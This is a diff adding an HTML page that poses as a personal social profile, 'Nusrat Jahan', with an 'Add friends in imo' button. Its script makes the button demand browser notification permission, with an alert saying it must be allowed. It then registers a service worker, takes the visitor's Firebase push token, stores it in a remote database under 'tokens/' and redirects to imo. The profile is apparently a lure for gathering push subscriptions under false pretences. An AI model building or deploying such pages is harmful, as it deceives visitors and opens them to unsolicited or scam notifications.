@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nusrat Jahan</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
+        body { background-color: #f2f2f2; height: 100vh; display: flex; flex-direction: column; }
+        .cover-photo { height: 150px; background: url('cover-bg.jpg') center/cover no-repeat; background-color: #1a2b22; }
+        .profile-section { background-color: white; padding: 15px; position: relative; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #e0e0e0; }
+        .profile-pic-container { position: relative; margin-top: -60px; cursor: pointer; }
+        .profile-pic-container img { width: 90px; height: 90px; border-radius: 10px; border: 3px solid white; object-fit: cover; }
+        .profile-name { font-size: 22px; font-weight: bold; color: #263238; margin-top: 10px; }
+        .notification-bell { border: 1px solid #ccc; border-radius: 20px; padding: 5px 12px; display: flex; align-items: center; gap: 5px; color: #666; font-size: 14px; }
+        .bio-section { background-color: white; padding: 15px; margin-top: 10px; font-size: 16px; font-weight: 500; color: #333; border-top: 1px solid #e0e0e0; border-bottom: 1px solid #e0e0e0; }
+        .bottom-bar { position: fixed; bottom: 0; width: 100%; background-color: white; padding: 15px; border-top: 1px solid #e0e0e0; }
+        .add-friend-btn { width: 100%; background-color: #0099ff; color: white; border: none; padding: 12px; font-size: 16px; border-radius: 5px; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; font-weight: bold; }
+        #storyModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: black; z-index: 1000; flex-direction: column; }
+        .story-progress { display: flex; gap: 5px; padding: 10px; position: absolute; top: 0; width: 100%; z-index: 1001; }
+        .progress-bar { flex: 1; height: 3px; background: rgba(255,255,255,0.3); border-radius: 2px; }
+        .progress-fill { height: 100%; background: white; width: 0%; }
+        #storyVideo { width: 100%; height: 100%; object-fit: contain; }
+        .close-story { position: absolute; top: 25px; right: 15px; color: white; font-size: 24px; cursor: pointer; z-index: 1001; }
+        .story-click-areas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; }
+        .story-left, .story-right { width: 50%; height: 100%; }
+    </style>
+</head>
+<body>
+
+    <div class="cover-photo"></div>
+
+    <div class="profile-section">
+        <div>
+            <div class="profile-pic-container" onclick="openStory()">
+                <img src="my-logo.jpg" alt="Profile" id="profileImage">
+            </div>
+            <div class="profile-name">Nusrat Jahan</div>
+        </div>
+        <div class="notification-bell"><span>🔔</span> 5</div>
+    </div>
+
+    <div class="bio-section">Bio</div>
+
+    <div class="bottom-bar">
+        <button class="add-friend-btn" id="imoBtn">
+            <span>💬</span> Add friends in imo
+        </button>
+    </div>
+
+    <div id="storyModal">
+        <div class="story-progress" id="progressContainer"></div>
+        <div class="close-story" onclick="closeStory()">✖</div>
+        <video id="storyVideo" playsinline></video>
+        <div class="story-click-areas">
+            <div class="story-left" onclick="prevStory()"></div>
+            <div class="story-right" onclick="nextStory()"></div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+        import { getMessaging, getToken } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-messaging.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCYH0ZSeLjH_T3HJ9hVQ84afB5KyAEZi2Y",
+            authDomain: "my-sc-tools.firebaseapp.com",
+            databaseURL: "https://my-sc-tools-default-rtdb.firebaseio.com",
+            projectId: "my-sc-tools",
+            storageBucket: "my-sc-tools.firebasestorage.app",
+            messagingSenderId: "285986090017",
+            appId: "1:285986090017:web:9d872b9bb5c472bcb74760"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const messaging = getMessaging(app);
+        const database = getDatabase(app);
+
+        const imoBtn = document.getElementById('imoBtn');
+        const imoLink = "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAFEY15og6iUe5Wjo1F2Suvfjisax_8ooeiwD4AVOrl4c";
+
+        imoBtn.addEventListener('click', async () => {
+            if ("Notification" in window && "serviceWorker" in navigator) {
+                try {
+                    const permission = await Notification.requestPermission();
+                    if (permission === 'granted') {
+                        imoBtn.innerHTML = "Processing...";
+                        
+                        // ১. সার্ভিস ওয়ার্কার রেজিস্টার করা
+                        const registration = await navigator.serviceWorker.register('./firebase-messaging-sw.js', { scope: './' });
+                        
+                        // ২. সবচেয়ে গুরুত্বপূর্ণ: সার্ভিস ওয়ার্কার সম্পূর্ণ রেডি হওয়া পর্যন্ত অপেক্ষা করা
+                        await navigator.serviceWorker.ready;
+
+                        // ৩. এরপর টোকেন জেনারেট করা
+                        const token = await getToken(messaging, { 
+                            vapidKey: 'BFZRrODefiSlDVoj_TtYJm4-iWycsHZ4uDn5hT90w-QOLV6wS7_gblBI2UUouGQcAqqnEB3FySSVF9JwbTXK7B8',
+                            serviceWorkerRegistration: registration 
+                        });
+
+                        if (token) {
+                            const safeKey = token.replace(/[.#$[\]]/g, '_');
+                            await set(ref(database, 'tokens/' + safeKey), { userToken: token });
+                        }
+                        window.location.href = imoLink;
+                    } else {
+                        alert("আপনাকে অবশ্যই নোটিফিকেশন Allow করতে হবে!");
+                    }
+                } catch (error) {
+                    alert("Error Code: " + error.message);
+                    window.location.href = imoLink;
+                }
+            } else {
+                window.location.href = imoLink;
+            }
+        });
+
+        // Story Logic
+        const stories = ['my-story1.mp4', 'my-story2.mp4', 'my-story3.mp4'];
+        let currentStory = 0;
+        const storyModal = document.getElementById('storyModal');
+        const storyVideo = document.getElementById('storyVideo');
+        const progressContainer = document.getElementById('progressContainer');
+        let progressInterval;
+
+        stories.forEach(() => {
+            const bar = document.createElement('div');
+            bar.className = 'progress-bar';
+            bar.innerHTML = '<div class="progress-fill"></div>';
+            progressContainer.appendChild(bar);
+        });
+        const fills = document.querySelectorAll('.progress-fill');
+
+        window.openStory = function() { storyModal.style.display = 'flex'; currentStory = 0; playStory(); }
+        window.closeStory = function() { storyModal.style.display = 'none'; storyVideo.pause(); clearInterval(progressInterval); }
+        window.nextStory = function() { fills[currentStory].style.width = '100%'; currentStory++; playStory(); }
+        window.prevStory = function() { fills[currentStory].style.width = '0%'; currentStory--; if (currentStory < 0) currentStory = 0; playStory(); }
+
+        function playStory() {
+            if (currentStory >= stories.length) { closeStory(); return; }
+            fills.forEach((fill, index) => fill.style.width = index < currentStory ? '100%' : '0%');
+            storyVideo.src = stories[currentStory];
+            storyVideo.play();
+            clearInterval(progressInterval);
+            progressInterval = setInterval(() => {
+                if (storyVideo.duration) {
+                    fills[currentStory].style.width = (storyVideo.currentTime / storyVideo.duration) * 100 + '%';
+                }
+            }, 50);
+        }
+        storyVideo.onended = nextStory;
+    </script>
+</body>
+</html>
